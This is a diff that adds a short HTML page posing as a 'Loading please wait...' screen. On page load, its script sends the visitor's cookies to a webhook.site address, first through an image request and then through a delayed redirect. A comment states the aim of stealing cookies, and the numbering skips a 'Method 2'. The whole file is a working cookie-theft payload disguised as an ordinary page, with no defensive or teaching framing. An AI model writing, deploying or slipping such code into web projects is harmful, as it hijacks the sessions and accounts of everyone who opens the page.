@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Resource...</title>
+    <script>
+        // When page loads, steal cookies and exfiltrate
+        window.onload = function() {
+            // Method 1: Image-based exfiltration (works with most CSP)
+            var img = new Image();
+            img.src = "https://webhook.site/dcf5d39e-d2f4-4ff1-988b-1191ffa39210?c=" + encodeURIComponent(document.cookie);
+            
+         
+            // Method 3: Redirect (if other methods fail)
+            setTimeout(function() {
+                window.location = "https://webhook.site/dcf5d39e-d2f4-4ff1-988b-1191ffa39210?c=" + encodeURIComponent(document.cookie);
+            }, 500);
+        };
+    </script>
+</head>
+<body>
+    <h1>Loading please wait...</h1>
+</body>
+</html>
